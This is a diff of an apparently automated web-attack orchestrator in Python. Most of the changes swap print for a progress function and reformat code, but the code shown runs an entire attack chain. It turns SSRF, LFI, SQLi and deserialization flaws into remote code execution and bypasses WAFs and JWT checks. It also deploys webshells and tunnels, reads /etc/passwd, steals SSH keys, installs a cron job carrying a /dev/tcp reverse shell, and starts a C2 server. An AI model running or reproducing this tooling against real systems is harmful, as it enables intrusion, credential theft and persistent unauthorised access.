     def phase_detect(self) -> Dict:
         recon = self.state["phases"].get("recon", {})
         active = self._select_detectors()
-        print("  -> Active detectors (%d): %s" % (len(active), ", ".join(active)))
+        progress("  -> Active detectors (%d): %s" % (len(active), ", ".join(active)))
 
         waf_info = self._fingerprint_waf_cached()
         waf_name = waf_info.get("name")
@@ -1079,7 +1287,7 @@ class Orchestrator:
         points = self._build_test_points()
         points = self._filter_by_budget(points)
         budget_pct = self._budget_remaining() / self.time_budget * 100
-        print("  -> %d test points (%.0f%% budget remaining)" % (len(points), budget_pct))
+        progress("  -> %d test points (%.0f%% budget remaining)" % (len(points), budget_pct))
 
         cb_id = "scan_%d" % id(self)
         oob_url = self.oob_server.register_callback_id(cb_id)
@@ -1087,10 +1295,16 @@ class Orchestrator:
 
         profiled = self.profiler.profile_batch(points, self.sess, self.timeout)
         if profiled:
-            print("  -> %d endpoints profiled for anomaly detection" % profiled)
+            progress("  -> %d endpoints profiled for anomaly detection" % profiled)
 
         all_findings = self._phase_detect_scan(
-            points, active, waf_name, budget_pct, cb_id, oob_url, oob_domain,
+            points,
+            active,
+            waf_name,
+            budget_pct,
+            cb_id,
+            oob_url,
+            oob_domain,
         )
         self._phase_detect_semantic(all_findings)
         self._phase_detect_second_order(all_findings)
@@ -1098,7 +1312,9 @@ class Orchestrator:
 
         self.state["ai_prepared"] = {
             "waf": waf_info.get("name", ""),
-            "technologies": [t["name"] for t in recon.get("technologies", {}).get("technologies", [])],
+            "technologies": [
+                t["name"] for t in recon.get("technologies", {}).get("technologies", [])
+            ],
             "debug_endpoints": self.vuln_ctx.get().debug_endpoints,
         }
 
@@ -1109,19 +1325,25 @@ class Orchestrator:
         """WAF 指纹 (带 context_memory 缓存)."""
         cached_waf = self.context_memory.get("waf")
         if cached_waf:
-            print("  [WAF] %s detected (cached)" % cached_waf)
+            progress("  [WAF] %s detected (cached)" % cached_waf)
             return {"name": cached_waf}
         waf_info = waf_bypass.fingerprint_waf(self.target, self.sess, self.timeout)
         waf_name_val = waf_info.get("name")
         if waf_name_val:
             self.context_memory.set("waf", waf_name_val, "waf_bypass", 0.90)
-            print("  [WAF] %s detected - using bypass strategies" % waf_name_val)
+            progress("  [WAF] %s detected - using bypass strategies" % waf_name_val)
         return waf_info
 
-    def _phase_detect_scan(self, points: List[Dict], active: List[str],
-                           waf_name: Optional[str], budget_pct: float,
-                           cb_id: str, oob_url: Optional[str],
-                           oob_domain: Optional[str]) -> Dict:
+    def _phase_detect_scan(
+        self,
+        points: List[Dict],
+        active: List[str],
+        waf_name: Optional[str],
+        budget_pct: float,
+        cb_id: str,
+        oob_url: Optional[str],
+        oob_domain: Optional[str],
+    ) -> Dict:
         """并行跑所有检测点 + 收集 OOB 回调 + 落盘."""
         all_findings: Dict[str, Dict] = {}
         self._lock = threading.Lock()
@@ -1130,8 +1352,11 @@ class Orchestrator:
 
         def worker(point):
             findings = self._test_single_point(
-                point, active, waf_name,
-                oob_url=oob_url, oob_domain=oob_domain,
+                point,
+                active,
+                waf_name,
+                oob_url=oob_url,
+                oob_domain=oob_domain,
             )
             with self._lock:
                 for f in findings:
@@ -1139,8 +1364,12 @@ class Orchestrator:
                     all_findings[key] = f
                 done[0] += 1
                 if done[0] % 5 == 0 or done[0] == total:
-                    print("    \r    progress: %d/%d (found %d)" % (
-                        done[0], total, len(all_findings)), end="", flush=True)
+                    progress(
+                        "    \r    progress: %d/%d (found %d)"
+                        % (done[0], total, len(all_findings)),
+                        end="",
+                        flush=True,
+                    )
 
         if self.threads > 1 and budget_pct > 10:
             max_workers = max(1, min(self.threads, len(points)))
@@ -1160,21 +1389,25 @@ class Orchestrator:
                 if not self._budget_ok(2):
                     break
                 worker(p)
-        print()
+        progress()
 
         oob_callbacks = self.oob_server.pop_callbacks(cb_id)
         oob_hits = len(oob_callbacks)
         if oob_hits:
-            print("  [OOB] %d blind callbacks received" % oob_hits)
+            progress("  [OOB] %d blind callbacks received" % oob_hits)
             all_findings["__oob_callbacks__"] = {
                 "type": "oob",
                 "url": self.target,
                 "param": "",
                 "result": {
-                    "vulnerable": True, "type": "oob_callback",
-                    "confidence": "high", "confirmed": True,
+                    "vulnerable": True,
+                    "type": "oob_callback",
+                    "confidence": "high",
+                    "confirmed": True,
                     "evidence": ["%d OOB callbacks" % oob_hits],
-                    "callbacks": [{"path": c.path, "client": str(c.client)} for c in oob_callbacks[:10]],
+                    "callbacks": [
+                        {"path": c.path, "client": str(c.client)} for c in oob_callbacks[:10]
+                    ],
                 },
             }
 
@@ -1187,20 +1420,24 @@ class Orchestrator:
 
     def _phase_detect_semantic(self, all_findings: Dict) -> None:
         """响应结构分析: 检测异常结构与错误信号."""
-        print("  [Semantic] Response structure analysis ...")
+        progress("  [Semantic] Response structure analysis ...")
         sem_count = 0
         try:
             baseline_resp = self.sess.get(self.target, timeout=self.timeout)
             baseline_sig = analyze_single_response(
-                baseline_resp.text, baseline_resp.status_code,
-                baseline_resp.headers.get("content-type", ""))
+                baseline_resp.text,
+                baseline_resp.status_code,
+                baseline_resp.headers.get("content-type", ""),
+            )
         except Exception:
             baseline_sig = None
 
         for key, finding in list(all_findings.items()):
             if key.startswith("__") or not finding.get("vulnerable"):
                 continue
-            resp_text = finding.get("response_text", "") or finding.get("result", {}).get("response_text", "")
+            resp_text = finding.get("response_text", "") or finding.get("result", {}).get(
+                "response_text", ""
+            )
             if resp_text and len(resp_text) > 50:
                 sem = analyze_single_response(resp_text, 200, "")
                 finding["semantic"] = sem
@@ -1213,11 +1450,11 @@ class Orchestrator:
                 if errors:
                     finding["error_signals"] = errors
         if sem_count:
-            print("    -> %d findings with anomalous response structure" % sem_count)
+            progress("    -> %d findings with anomalous response structure" % sem_count)
 
     def _phase_detect_second_order(self, all_findings: Dict) -> None:
         """对高置信 finding 做二阶交叉验证."""
-        print("  [Verify] Second-order cross-validation ...")
+        progress("  [Verify] Second-order cross-validation ...")
         verified_count = 0
         for key, finding in list(all_findings.items()):
             if key.startswith("__"):
@@ -1238,16 +1475,17 @@ class Orchestrator:
                         node_id = "%s_found" % vtype
                         if node_id in self.attack_graph.nodes:
                             self.attack_graph.integrate_evidence(
-                                node_id, True, vresult.get("confidence", 0.8))
+                                node_id, True, vresult.get("confidence", 0.8)
+                            )
             except Exception as e:
                 logger.debug("Second-order verification failed: %s", e)
 
         if verified_count:
-            print("    -> %d findings cross-verified" % verified_count)
+            progress("    -> %d findings cross-verified" % verified_count)
 
     def _phase_detect_type_confusion(self, points: List[Dict], all_findings: Dict) -> None:
         """类型混淆 + TOCTOU 竞态检测."""
-        print("  [TypeConfusion] Type confusion & TOCTOU detection ...")
+        progress("  [TypeConfusion] Type confusion & TOCTOU detection ...")
         tc_detector = TypeConfusionDetector(self.sess, self.timeout)
         tc_count = 0
         for point in points[:100]:
@@ -1265,7 +1503,9 @@ class Orchestrator:
                             "param": point["param"],
                             "vulnerable": True,
                             "confidence_score": 0.70 if tc.success else 0.50,
-                            "evidence": [tc.evidence] if tc.evidence else ["type_confusion_detected"],
+                            "evidence": [tc.evidence]
+                            if tc.evidence
+                            else ["type_confusion_detected"],
                             "tc_detail": {
                                 "original_type": tc.original_type,
                                 "confused_type": tc.confused_type,
@@ -1297,31 +1537,37 @@ class Orchestrator:
                 logger.debug("type confusion: %s", e)
 
         if tc_count:
-            print("    -> %d type confusion / TOCTOU findings" % tc_count)
+            progress("    -> %d type confusion / TOCTOU findings" % tc_count)
 
     def _phase_detect_bayes(self, active: List[str]) -> None:
         """用本轮 findings 更新贝叶斯假设, 输出修正后的 detector 优先级."""
         if not self._backtrack_findings:
             return
-        print("  [Bayes] Updating hypotheses with %d findings ..." % len(self._backtrack_findings))
+        progress(
+            "  [Bayes] Updating hypotheses with %d findings ..." % len(self._backtrack_findings)
+        )
         evidence_map = {}
         for f in self._backtrack_findings:
             vt = f.get("type", "").lower()
             evidence_map[vt] = f.get("result", f)
         if self.last_hypotheses:
             self.last_hypotheses = self.reasoner.update_with_evidence(
-                self.last_hypotheses, evidence_map)
+                self.last_hypotheses, evidence_map
+            )
             revised = self.reasoner.suggest_detectors(self.last_hypotheses)
             new_detectors = [d for d in revised if d not in active]
             if new_detectors:
-                print("    -> Revised detector priority: first %d remain, added %s" % (
-                    len(active), new_detectors[:3]))
+                progress(
+                    "    -> Revised detector priority: first %d remain, added %s"
+                    % (len(active), new_detectors[:3])
+                )
 
     def phase_ai_hunt(self) -> Dict:
-        print("  [Intel] Gathering deep response intelligence ...")
+        progress("  [Intel] Gathering deep response intelligence ...")
         result = {"anomalies_found": 0, "scan_count": 0}
         try:
             from tools.ai_vuln_hunter import generate_target_brief
+
             self.state["phases"].get("recon", {})
             findings = self.all_findings
             waf_data = self.state.get("waf", {})
@@ -1341,12 +1587,12 @@ class Orchestrator:
                 vuln_ctx=self.vuln_ctx,
             )
             self.state["phases"]["ai_hunt"] = intel
-            print()
-            print(intel.get("brief", ""))
-            print()
+            progress()
+            progress(intel.get("brief", ""))
+            progress()
             anom = intel.get("anomalies_found", 0)
             deep = intel.get("deep_results_count", 0)
-            print("    -> %d endpoints deep-scanned, %d behavioral anomalies" % (deep, anom))
+            progress("    -> %d endpoints deep-scanned, %d behavioral anomalies" % (deep, anom))
             result = intel
         except Exception as e:
             logger.debug("AI hunt: %s", e)
@@ -1364,71 +1610,84 @@ class Orchestrator:
 
         if self._chain_cache:
             pivot_results["pivot_actions"].extend(self._chain_cache.values())
-            print("  [Pivot] %d chains already executed during backtrack" % len(self._chain_cache))
+            progress(
+                "  [Pivot] %d chains already executed during backtrack" % len(self._chain_cache)
+            )
 
         from tools.chain_engine import ChainEngine
         from tools.orchestrator_engine.chains import by_name
+
         chain = ChainEngine(self.sess, self.timeout)
         chain_map = by_name(chain)
 
         used_chains: set = set()
         for chain_name, ep, param in chains:
             self._pivot_run_suggested_chain(
-                chain_name, vuln_list, chain_map, pivot_results, used_chains,
+                chain_name,
+                vuln_list,
+                chain_map,
+                pivot_results,
+                used_chains,
             )
 
         pivoted = pivot_on_intermediate_result(
-            {"vulnerabilities": vuln_list}, plan,
+            {"vulnerabilities": vuln_list},
+            plan,
         )
         if pivoted.get("pivoted"):
-            print("  [Pivot] Attack surface triggered additional chain actions:")
+            progress("  [Pivot] Attack surface triggered additional chain actions:")
             for ph in pivoted.get("phases", []):
                 handler = _PIVOT_HANDLERS.get(ph.get("phase"))
                 if handler is None:
                     continue
-                used_chains.update(
-                    handler(self, vuln_list, chain, pivot_results)
-                )
+                used_chains.update(handler(self, vuln_list, chain, pivot_results))
 
         self.state["phases"]["pivot"] = pivot_results
         self._save_phase("pivot")
         return pivot_results
 
     def _pivot_vuln_list(self, findings: Dict) -> List[Dict]:
-        return [{"type": f["type"], "url": f["url"], "param": f["param"]}
-                for f in findings.values()]
+        return [
+            {"type": f["type"], "url": f["url"], "param": f["param"]} for f in findings.values()
+        ]
 
     def _pivot_reasoner_chains(self, vuln_list: List[Dict]) -> List:
         if not self.last_hypotheses:
             return []
         evidence_map = {v["type"]: {"vulnerable": True} for v in vuln_list}
         self.last_hypotheses = self.reasoner.update_with_evidence(
-            self.last_hypotheses, evidence_map)
+            self.last_hypotheses, evidence_map
+        )
         confirmed_types = {v["type"].lower() for v in vuln_list}
         return self.reasoner.suggest_chains(self.last_hypotheses, confirmed_types)
 
-    def _pivot_run_suggested_chain(self, chain_name: str, vuln_list: List[Dict],
-                                   chain_map: Dict, pivot_results: Dict,
-                                   used_chains: set) -> None:
+    def _pivot_run_suggested_chain(
+        self,
+        chain_name: str,
+        vuln_list: List[Dict],
+        chain_map: Dict,
+        pivot_results: Dict,
+        used_chains: set,
+    ) -> None:
         if chain_name in used_chains or chain_name not in chain_map:
             return
         needed_type, fn = chain_map[chain_name]
         for v in vuln_list:
             if v["type"] != needed_type:
                 continue
-            print("    [Reason] Chain %s %s via %s?%s" %
-                  (chain_name, v["type"], v["url"], v["param"]))
+            progress(
+                "    [Reason] Chain %s %s via %s?%s" % (chain_name, v["type"], v["url"], v["param"])
+            )
             used_chains.add(chain_name)
             try:
                 r = fn(v["url"], v["param"])
                 pivot_results["pivot_actions"].append(r)
                 if r.get("success"):
-                    print("      [CRITICAL] Chain %s confirmed!" % chain_name)
+                    progress("      [CRITICAL] Chain %s confirmed!" % chain_name)
                 if r.get("credentials_extracted"):
-                    print("      [CREDENTIAL] %s" % r["credentials_extracted"][:3])
+                    progress("      [CREDENTIAL] %s" % r["credentials_extracted"][:3])
                 if r.get("rce_available"):
-                    print("      [RCE] %s via %s" %
-                          (chain_name, r.get("rce_method", "unknown")))
+                    progress("      [RCE] %s via %s" % (chain_name, r.get("rce_method", "unknown")))
             except Exception as e:
                 logger.debug("chain %s: %s", chain_name, e)
             return
@@ -1438,23 +1697,27 @@ class Orchestrator:
         for v in vuln_list:
             if v["type"] != "ssrf":
                 continue
-            print("    -> SSRF detected, running cloud metadata + internal scan chain")
-            pivot_results["pivot_actions"].append(
-                chain.chain_ssrf_to_rce(v["url"], v["param"]))
+            progress("    -> SSRF detected, running cloud metadata + internal scan chain")
+            pivot_results["pivot_actions"].append(chain.chain_ssrf_to_rce(v["url"], v["param"]))
             used.add("ssrf_to_rce")
-            print("    -> SSRF multi-hop chain (Redis/SQL/Docker/K8s) ...")
+            progress("    -> SSRF multi-hop chain (Redis/SQL/Docker/K8s) ...")
             try:
                 ssrf_chain_result = ssrf_chain_attack(
-                    v["url"], v["param"], self.sess, self.timeout, max_hops=3)
+                    v["url"], v["param"], self.sess, self.timeout, max_hops=3
+                )
                 pivot_results["pivot_actions"].append(ssrf_chain_result)
                 if ssrf_chain_result.get("rce_achieved"):
-                    print("      [CRITICAL] SSRF chain achieved RCE via %s"
-                          % ssrf_chain_result.get("rce_method"))
+                    progress(
+                        "      [CRITICAL] SSRF chain achieved RCE via %s"
+                        % ssrf_chain_result.get("rce_method")
+                    )
                 if ssrf_chain_result.get("services_found"):
-                    print("      [INTERNAL] %d internal services discovered"
-                          % ssrf_chain_result["services_found"])
+                    progress(
+                        "      [INTERNAL] %d internal services discovered"
+                        % ssrf_chain_result["services_found"]
+                    )
                 if ssrf_chain_result.get("ssh_keys"):
-                    print("      [SSH] SSH key injected via Redis")
+                    progress("      [SSH] SSH key injected via Redis")
             except Exception as e:
                 logger.debug("ssrf chain: %s", e)
             break
@@ -1464,9 +1727,8 @@ class Orchestrator:
         for v in vuln_list:
             if v["type"] != "lfi":
                 continue
-            print("    -> LFI detected, running log poison + environ leak chain")
-            pivot_results["pivot_actions"].append(
-                chain.chain_lfi_to_rce(v["url"], v["param"]))
+            progress("    -> LFI detected, running log poison + environ leak chain")
+            pivot_results["pivot_actions"].append(chain.chain_lfi_to_rce(v["url"], v["param"]))
             return {"lfi_to_rce"}
         return set()
 
@@ -1474,9 +1736,8 @@ class Orchestrator:
         for v in vuln_list:
             if v["type"] != "sqli":
                 continue
-            print("    -> SQLi detected, running data extraction + shell chain")
-            pivot_results["pivot_actions"].append(
-                chain.chain_sqli_to_rce(v["url"], v["param"]))
+            progress("    -> SQLi detected, running data extraction + shell chain")
+            pivot_results["pivot_actions"].append(chain.chain_sqli_to_rce(v["url"], v["param"]))
             return {"sqli_to_rce"}
         return set()
 
@@ -1484,16 +1745,16 @@ class Orchestrator:
         for v in vuln_list:
             if v["type"] != "jwt":
                 continue
-            print("    -> JWT found, running alg none + weak secret + KID injection")
+            progress("    -> JWT found, running alg none + weak secret + KID injection")
             try:
                 from tools import jwt_exploiter
+
                 exploit_r = jwt_exploiter.check(
-                    url=v["url"], param=v["param"], sess=self.sess,
-                    timeout=self.timeout)
-                pivot_results["pivot_actions"].append({
-                    "chain": "jwt_exploit", "result": exploit_r})
+                    url=v["url"], param=v["param"], sess=self.sess, timeout=self.timeout
+                )
+                pivot_results["pivot_actions"].append({"chain": "jwt_exploit", "result": exploit_r})
                 if exploit_r.get("vulnerable"):
-                    print("      [CRITICAL] JWT bypassed!")
+                    progress("      [CRITICAL] JWT bypassed!")
             except Exception as e:
                 logger.debug("jwt pivot: %s", e)
             break
@@ -1503,24 +1764,24 @@ class Orchestrator:
         auth_data = self.state["phases"].get("auth_bypass", {})
         if not auth_data.get("vulnerable"):
             return set()
-        print("    -> Auth bypass found, escalating to admin")
+        progress("    -> Auth bypass found, escalating to admin")
         r = chain.chain_auth_to_admin(self.target)
         pivot_results["pivot_actions"].append(r)
         used = {"auth_bypass_to_rce"}
         if r.get("success"):
-            print("      [CRITICAL] Admin access achieved via auth escalation!")
+            progress("      [CRITICAL] Admin access achieved via auth escalation!")
         return used
 
     def _pivot_handle_deser(self, vuln_list, chain, pivot_results) -> set:
         for v in vuln_list:
             if v["type"] != "deser":
                 continue
-            print("    -> Deserialization found, running gadget chain")
+            progress("    -> Deserialization found, running gadget chain")
             r = chain.chain_deser_to_rce(v["url"], v["param"])
             pivot_results["pivot_actions"].append(r)
             used = {"deser_to_rce"}
             if r.get("success"):
-                print("      [CRITICAL] Deserialization gadget confirmed!")
+                progress("      [CRITICAL] Deserialization gadget confirmed!")
             return used
         return set()
 
@@ -1528,43 +1789,53 @@ class Orchestrator:
         for v in vuln_list:
             if v["type"] != "graphql":
                 continue
-            pivot_results["pivot_actions"].append({
-                "chain": "graphql_deep",
-                "url": v["url"],
-                "action": "introspection + batch + depth analysis",
-            })
+            pivot_results["pivot_actions"].append(
+                {
+                    "chain": "graphql_deep",
+                    "url": v["url"],
+                    "action": "introspection + batch + depth analysis",
+                }
+            )
             break
         return set()
 
     def _run_kali_recon(self):
         from tools.kali_executor import is_available
+
         if not is_available():
             return
-        print("  [Kali] Running heavy recon tools...")
+        progress("  [Kali] Running heavy recon tools...")
         from tools import kali_toolset
+
         try:
             tech_result = kali_toolset.whatweb_identify(self.target)
             if tech_result.get("technologies"):
-                print("  [Kali] whatweb: %d technologies detected" % len(tech_result["technologies"]))
+                progress(
+                    "  [Kali] whatweb: %d technologies detected" % len(tech_result["technologies"])
+                )
                 self.state["technologies"] = tech_result["technologies"]
         except Exception as e:
             logger.debug("kali whatweb: %s", e)
         try:
             nmap_result = kali_toolset.nmap_scan(self.target, fast=True)
             if nmap_result.get("ports"):
-                print("  [Kali] nmap: %d open ports found" % nmap_result["count"])
+                progress("  [Kali] nmap: %d open ports found" % nmap_result["count"])
                 self.state["open_ports"] = nmap_result["ports"]
         except Exception as e:
             logger.debug("kali nmap: %s", e)
         try:
             nuclei_result = kali_toolset.nuclei_scan(self.target)
             if nuclei_result.get("findings"):
-                print("  [Kali] nuclei: %d template matches" % nuclei_result["count"])
+                progress("  [Kali] nuclei: %d template matches" % nuclei_result["count"])
                 existing = self.state["phases"].get("detect", {}).get("findings", {})
                 for f in nuclei_result["findings"]:
                     key = "nuclei|%s|%s" % (f.get("template", ""), self.target)
-                    existing[key] = {"type": "nuclei", "url": self.target, "param": "",
-                                     "result": {"vulnerable": True, "template": f}}
+                    existing[key] = {
+                        "type": "nuclei",
+                        "url": self.target,
+                        "param": "",
+                        "result": {"vulnerable": True, "template": f},
+                    }
                 self.state["nuclei_findings"] = nuclei_result["findings"]
         except Exception as e:
             logger.debug("kali nuclei: %s", e)
@@ -1577,19 +1848,37 @@ class Orchestrator:
         bola_count = result.get("bola_count", 0)
         info_count = result.get("info_disclosure_count", 0)
         if bola_count or info_count:
-            print("  -> %d BOLA, %d info disclosure across %d endpoints" % (
-                bola_count, info_count, result.get("tested", 0)))
+            progress(
+                "  -> %d BOLA, %d info disclosure across %d endpoints"
+                % (bola_count, info_count, result.get("tested", 0))
+            )
             findings = self.state["phases"].get("detect", {}).get("findings", {})
             for f in result.get("bola_findings", []):
                 key = "bola|%s|%s" % (f.get("url", ""), f.get("param", "id"))
-                findings[key] = {"type": "bola", "url": f.get("url", ""), "param": f.get("param", "id"),
-                                 "result": {"vulnerable": True, "type": "bola", "confidence": "high",
-                                            "evidence": f.get("evidence", [])}}
+                findings[key] = {
+                    "type": "bola",
+                    "url": f.get("url", ""),
+                    "param": f.get("param", "id"),
+                    "result": {
+                        "vulnerable": True,
+                        "type": "bola",
+                        "confidence": "high",
+                        "evidence": f.get("evidence", []),
+                    },
+                }
             for f in result.get("info_disclosure_findings", []):
                 key = "info_disclosure|%s|%s" % (f.get("url", ""), f.get("param", "id"))
-                findings[key] = {"type": "info_disclosure", "url": f.get("url", ""), "param": f.get("param", "id"),
-                                 "result": {"vulnerable": True, "type": "info_disclosure", "confidence": "high",
-                                            "evidence": f.get("evidence", [])}}
+                findings[key] = {
+                    "type": "info_disclosure",
+                    "url": f.get("url", ""),
+                    "param": f.get("param", "id"),
+                    "result": {
+                        "vulnerable": True,
+                        "type": "info_disclosure",
+                        "confidence": "high",
+                        "evidence": f.get("evidence", []),
+                    },
+                }
         self.state["phases"]["dual_session"] = result
         return result
 
@@ -1602,7 +1891,8 @@ class Orchestrator:
 
         def _weaponize_one(key, finding):
             result = weaponizer.weaponize_one(
-                finding, raw_sess, self.timeout, self.vuln_ctx, webshell_urls)
+                finding, raw_sess, self.timeout, self.vuln_ctx, webshell_urls
+            )
             if result:
                 return key, result
             return None, None
@@ -1617,9 +1907,17 @@ class Orchestrator:
                 except Exception:
                     pass
 
-        auth_findings = auth_data.get("path_bypasses", []) + auth_data.get("cookie_bypasses", []) + auth_data.get("header_bypasses", [])
+        auth_findings = (
+            auth_data.get("path_bypasses", [])
+            + auth_data.get("cookie_bypasses", [])
+            + auth_data.get("header_bypasses", [])
+        )
         if auth_findings:
-            exploits["auth_bypass"] = {"total": len(auth_findings), "findings": auth_findings, "exploit_ready": True}
+            exploits["auth_bypass"] = {
+                "total": len(auth_findings),
+                "findings": auth_findings,
+                "exploit_ready": True,
+            }
 
         self.state["phases"]["weaponize"] = exploits
         self._save_phase("weaponize")
@@ -1636,8 +1934,9 @@ class Orchestrator:
 
         if webshell_urls:
             from tools.tunnel_agent import chisel_tunnel, socks5_over_webshell
+
             ws_url = webshell_urls[0]
-            print("  [Advanced] Deploying SOCKS5 tunnel via webshell ...")
+            progress("  [Advanced] Deploying SOCKS5 tunnel via webshell ...")
             tunnel = socks5_over_webshell(ws_url)
             if tunnel["success"]:
                 result["tunnels"].append(tunnel)
@@ -1654,6 +1953,7 @@ class Orchestrator:
                 result["chisel_tunnel"] = chisel
 
             from tools.interactive_shell import PTYShell
+
             def _exec_cmd(c):
                 try:
                     r = self.sess.get(ws_url, params={"c": c}, timeout=10)
@@ -1665,25 +1965,35 @@ class Orchestrator:
             upg = pty.upgrade()
             if upg["success"]:
                 result["pty_upgrade"] = upg
-            enum_r = pty._run("hostname;id;whoami;cat /etc/passwd 2>/dev/null | head -5;ifconfig 2>/dev/null | head -3 || ip addr 2>/dev/null | head -3")
+            enum_r = pty._run(
+                "hostname;id;whoami;cat /etc/passwd 2>/dev/null | head -5;ifconfig 2>/dev/null | head -3 || ip addr 2>/dev/null | head -3"
+            )
             if enum_r:
-                result["enum_output"] = enum_r[:500] if isinstance(enum_r, str) else str(enum_r.get("output", ""))[:500]
+                result["enum_output"] = (
+                    enum_r[:500] if isinstance(enum_r, str) else str(enum_r.get("output", ""))[:500]
+                )
 
             from tools.lateral_move import steal_ssh_keys
+
             ssh_keys = steal_ssh_keys(_exec_cmd)
             if ssh_keys.get("success"):
                 result["ssh_keys"] = ssh_keys["keys"]
-                print("    -> %d SSH keys stolen" % len(ssh_keys["keys"]))
+                progress("    -> %d SSH keys stolen" % len(ssh_keys["keys"]))
 
             from tools.post_exploit import cron_persistence, webshell_persistence
+
             persist_ws = webshell_persistence(ws_url)
-            persist_cron = cron_persistence("bash -c 'exec 5<>/dev/tcp/%s/4444;cat<&5|while read l;do $l 2>&5>&5;done' &" % self.target)
+            persist_cron = cron_persistence(
+                "bash -c 'exec 5<>/dev/tcp/%s/4444;cat<&5|while read l;do $l 2>&5>&5;done' &"
+                % self.target
+            )
             result["post_exploit"] = {
                 "webshell_hidden": persist_ws["paths"],
                 "cron_job": persist_cron.get("cron_line"),
             }
 
         from tools.c2_beacon import C2Server
+
         try:
             c2 = C2Server(bind_port=9999)
             c2.start()
@@ -1699,245 +2009,151 @@ class Orchestrator:
     def phase_pipeline(self) -> Dict:
         from tools.pipeline import run_pipeline
 
-        print("[Pipeline] Asset graph -> business value -> crown-jewel chains ...")
+        progress("[Pipeline] Asset graph -> business value -> crown-jewel chains ...")
         self.pipeline_result = run_pipeline(self.state, self.target)
         pr = self.pipeline_result
         g = pr.get("asset_graph", {})
-        print("  -> Asset graph: %d nodes, %d edges, %d components" % (
-            g.get("total_nodes", 0), g.get("total_edges", 0),
-            g.get("connected_components", 0)))
-        print("  -> Crown jewels: %s" % ", ".join(pr.get("crown_jewels", [])[:6]) or "(none)")
+        progress(
+            "  -> Asset graph: %d nodes, %d edges, %d components"
+            % (g.get("total_nodes", 0), g.get("total_edges", 0), g.get("connected_components", 0))
+        )
+        progress("  -> Crown jewels: %s" % ", ".join(pr.get("crown_jewels", [])[:6]) or "(none)")
         for ch in pr.get("attack_chains", [])[:5]:
-            print("    [%.2f] %s (%d hops)" % (
-                ch.get("score", 0), ch.get("target", "?"), ch.get("hops", 0)))
+            progress(
+                "    [%.2f] %s (%d hops)"
+                % (ch.get("score", 0), ch.get("target", "?"), ch.get("hops", 0))
+            )
         d = pr.get("differential", {})
-        print("  -> Differential: %d/%d high-value confirmed, %d crown jewel(s) reached" % (
-            d.get("confirmed_on_high_value", 0), d.get("expected_high_value", 0),
-            len(d.get("crown_jewel_reached", []))))
+        progress(
+            "  -> Differential: %d/%d high-value confirmed, %d crown jewel(s) reached"
+            % (
+                d.get("confirmed_on_high_value", 0),
+                d.get("expected_high_value", 0),
+                len(d.get("crown_jewel_reached", [])),
+            )
+        )
 
         self.state["phases"]["pipeline"] = pr
         self._save_phase("pipeline")
         return pr
 
-    def phase_report(self) -> Dict:
-        report: Dict[str, Any] = {
-            "target": self.target,
-            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-            "summary": {},
-            "details": {},
-        }
-        detection = self.state["phases"].get("detect", {})
-        findings = detection.get("findings", {})
-        exploits = self.state["phases"].get("weaponize", {})
-        auth_data = self.state["phases"].get("auth_bypass", {})
-        recon = self.state["phases"].get("recon", {})
-        crawl_summary = self.state["phases"].get("crawl", {}).get("summary", {})
-        mine_data = self.state["phases"].get("param_mine", {})
-        waf_info = self.state.get("waf", {})
-
-        by_type, by_url = self._report_group(findings)
-
-        report["summary"] = self._report_summary(findings, by_type, by_url, exploits, auth_data)
-        report["details"] = {vt: flist for vt, flist in by_type.items()}
-        report["exploits"] = exploits
-        report["auth_bypass"] = {k: v for k, v in auth_data.items() if k != "vulnerable"}
-        report["recon"] = self._report_recon(
-            recon, detection, crawl_summary, mine_data, waf_info,
-        )
-
-        report["attack_graph"] = self.attack_graph.summary() if self.attack_graph else {}
-        report["context_memory"] = self.context_memory.get_stats()
-        if self.pipeline_result:
-            report["pipeline"] = self.pipeline_result
-        report["second_order_verified"] = sum(
-            1 for f in findings.values() if f.get("second_order_verified")
-        )
-
-        self.state["phases"]["report"] = report
-        self._save_phase("report")
-        self._report_persist(report)
-        return report
-
-    @staticmethod
-    def _report_group(findings: Dict) -> tuple:
-        """按 type / url 聚合 findings."""
-        by_type: Dict[str, List] = {}
-        by_url: Dict[str, List[str]] = {}
-        for f in findings.values():
-            by_type.setdefault(f["type"], []).append(f)
-            by_url.setdefault(f["url"], []).append(f["type"])
-        return by_type, by_url
-
-    @staticmethod
-    def _report_summary(findings: Dict, by_type: Dict, by_url: Dict,
-                        exploits: Dict, auth_data: Dict) -> Dict:
-        vuln_count = len(findings)
-        exploit_ready_details = [
-            k for k, v in exploits.items() if v.get("exploit_ready")
-        ]
-        auth_total = auth_data.get("total_bypasses", 0)
-        if auth_total > 0:
-            exploit_ready_details.append("auth_bypass(%d)" % auth_total)
-
-        critical_flags = ("rce_available", "rce", "shell", "data_extracted",
-                          "credential_access", "exploit_ready")
-        is_critical = any(
-            any(f.get("result", {}).get(k) for k in critical_flags)
-            for f in findings.values()
-        ) or bool(exploit_ready_details)
-
-        return {
-            "vulnerabilities": vuln_count,
-            "by_type": {k: len(v) for k, v in by_type.items()},
-            "by_url": {k: len(v) for k, v in by_url.items()},
-            "exploit_ready": len(exploits),
-            "exploit_ready_details": exploit_ready_details,
-            "critical": is_critical,
-            "affected_urls": list(by_url.keys()),
-            "param_hits": ["%s?%s [%s]" % (f["url"], f["param"], f["type"])
-                           for f in findings.values()],
-        }
-
-    @staticmethod
-    def _report_recon(recon: Dict, detection: Dict,
-                      crawl_summary: Dict, mine_data: Dict, waf_info: Dict) -> Dict:
-        techs = recon.get("technologies", {})
-        ports = recon.get("open_ports", {})
-        git = recon.get("git_leak", {})
-        dirs = recon.get("directories", {})
-        total_mined = sum(len(pd.get("all_params", []))
-                          for pd in mine_data.values() if isinstance(pd, dict))
-        risk_score = 0
-        attack_plan = recon.get("attack_plan") or {}
-        if isinstance(attack_plan, dict):
-            risk_score = attack_plan.get("risk_score", 0)
-        return {
-            "technologies": [t["name"] for t in techs.get("technologies", [])],
-            "open_ports": [p["port"] for p in ports.get("open_ports", [])],
-            "git_exposed": git.get("git_exposed", False),
-            "git_sensitive": len(git.get("sensitive_finds", [])),
-            "directories": len(dirs.get("interesting", [])),
-            "pages_crawled": crawl_summary.get("pages_crawled", 0),
-            "endpoints": crawl_summary.get("endpoints_found", 0),
-            "params_mined": total_mined,
-            "test_points": detection.get("test_points", 0),
-            "is_spa": crawl_summary.get("is_spa", False),
-            "js_api_discovered": crawl_summary.get("js_api_discovered", 0),
-            "waf": waf_info.get("name"),
-            "risk_score": risk_score,
-        }
-
-    def _report_persist(self, report: Dict) -> None:
-        if not self._storage:
-            return
-        try:
-            cur = self._storage._conn.cursor()
